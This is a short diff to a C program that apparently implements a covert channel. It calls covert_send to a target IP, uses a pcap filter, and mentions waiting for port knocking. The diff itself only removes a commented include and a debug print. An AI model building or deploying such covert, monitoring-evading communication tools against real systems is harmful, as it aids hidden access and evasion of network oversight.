@@ -2,7 +2,6 @@
 #include "../src/encrypt_utils.h"
 #include "../src/socketwrappers.h"
 #include "../src/covert_wrappers.h"
-//#include "../src/portknocking.h"
 #include "../src/inotify.h"
 #include "../src/libpcap.h"
 
@@ -77,7 +76,6 @@ int main(int argc, char **argv){
     }
 
     CreateFilter(Filter, pcapfilter);
-    printf("Port1: %d",Filter.port_short[0]);
 	covert_send(localip, targetip, Filter.port_short[0], Filter.port_short[0], data, 0);
 	//wait for port knocking
     printf("Filter: %s\n",pcapfilter);
